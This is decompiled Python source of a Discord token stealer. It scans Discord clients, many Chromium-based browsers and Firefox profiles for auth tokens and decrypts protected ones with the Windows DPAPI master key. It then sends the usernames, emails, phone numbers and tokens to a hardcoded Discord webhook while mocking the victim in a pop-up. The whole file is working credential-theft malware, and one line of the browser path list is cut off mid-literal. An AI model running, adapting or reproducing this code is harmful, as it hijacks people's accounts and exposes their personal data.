# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: dc_token.py
# Bytecode version: 3.9.0beta5 (3425)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

global pcuser  # inserted
import base64
import json
import os
import re
import requests
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from tkinter import messagebox

def pcuser():
    global pcuser  # inserted
    try:
        pcuser = os.getlogin()
    except:
        pcuser = 'Unknown'
    return pcuser
pcuser()

class DiscordToken:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        upload_tokens(self.webhook_url).upload()

class extract_tokens:
    def __init__(self) -> None:
        self.base_url = 'https://discord.com/api/v9/users/@me'
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.regexp = '[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}'
        self.regexp_enc = 'dQw4w9WgXcQ:[^\\\"]*'
        self.tokens = []
        self.uids = []
        self.extract()

    def extract(self) -> None:
        paths = {'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\', 'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\', 'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\', 'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\', 'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\', 'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\', 'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\', 'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\', 'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\', 'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\', 'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\', '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\', 'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\', 'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\', 'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\', 'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\', '
        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            _discord = name.replace(' ', '').lower()
            if 'cord' in path:
                if not os.path.exists(self.roaming + f'\\{_discord}\\Local State'):
                    continue
                for file_name in os.listdir(path):
                    if file_name.endswith(('log', 'ldb')):
                        self.process_file(path, file_name, True, _discord)
            else:  # inserted
                for file_name in os.listdir(path):
                    if file_name.endswith(('log', 'ldb')):
                        self.process_file(path, file_name)
        self.process_firefox_tokens()

    def process_file(self, path, file_name, encrypted=False, _discord=None):
        full_path = f'{path}\\{file_name}'
        with open(full_path, errors='ignore') as file:
            lines = [x.strip() for x in file.readlines() if x.strip()]
        for line in lines:
            if encrypted:
                for y in re.findall(self.regexp_enc, line):
                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{_discord}\\Local State'))
                    self.add_token(token)
            else:  # inserted
                for token in re.findall(self.regexp, line):
                    self.add_token(token)

    def process_firefox_tokens(self):
        if os.path.exists(self.roaming + '\\Mozilla\\Firefox\\Profiles'):
            for path, _, files in os.walk(self.roaming + '\\Mozilla\\Firefox\\Profiles'):
                for _file in files:
                    if _file.endswith('.sqlite'):
                        full_path = f'{path}\\{_file}'
                        with open(full_path, errors='ignore') as file:
                            lines = [x.strip() for x in file.readlines() if x.strip()]
                        for line in lines:
                            for token in re.findall(self.regexp, line):
                                self.add_token(token)

    def add_token(self, token):
        if self.validate_token(token):
            uid = requests.get(self.base_url, headers={'Authorization': token}).json().get('id')
            if uid and uid not in self.uids:
                self.tokens.append(token)
                self.uids.append(uid)

    def validate_token(self, token: str) -> bool:
        r = requests.get(self.base_url, headers={'Authorization': token})
        return r.status_code == 200

    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        return decrypted_pass[:(-16)].decode()

    def get_master_key(self, path: str) -> str:
        if not os.path.exists(path):
            return
        with open(path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

class upload_tokens:
    def __init__(self, webhook_url: str):
        self.tokens = extract_tokens().tokens
        self.webhook_url = webhook_url

    def upload(self) -> None:
        if not self.tokens:
            return
        data = []
        for token in self.tokens:
            headers = {'Authorization': token}
            user = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers).json()
            try:
                user_data = {'username': user['username'], 'email': user['email'], 'phone': user['phone'], 'token': token, 'pcuser': pcuser}
                data.append(user_data)
                messagebox.showerror('whoops', f'i have your discord account now (:\n {user}')
            except KeyError:
                continue
        requests.post(self.webhook_url, json={'content': json.dumps(data)})

    def calc_flags(self, flags: int) -> list:
        flags_dict = {'DISCORD_EMPLOYEE': {'emoji': '<:staff:968704541946167357>', 'shift': 0, 'ind': 1}, 'DISCORD_PARTNER': {'emoji': '<:partner:968704542021652560>', 'shift': 1, 'ind': 2}, 'HYPESQUAD_EVENTS': {'emoji': '<:hypersquad_events:968704541774192693>', 'shift': 2, 'ind': 4}, 'BUG_HUNTER_LEVEL_1': {'emoji': '<:bug_hunter_1:968704541677723648>', 'shift': 3, 'ind': 8}, 'HOUSE_BRAVERY': {'emoji': '<:hypersquad_1:968704541501571133>', 'shift': 6, 'ind': 64}}
        user_flags = []
        for flag_name, flag_data in flags_dict.items():
            if flags & 1 << flag_data['shift']:
                user_flags.append(flag_data['emoji'])
        return user_flags
if __name__ == '__main__':
    webhook_url = 'https://discord.com/api/webhooks/1242077851927314552/P_MWNzgM_1mFDKJ2Fx5E-XAaJA9JD465IGyg2BJfUA7zZwT4DOVlEzzkFAINgggq4esE'
    DiscordToken(webhook_url)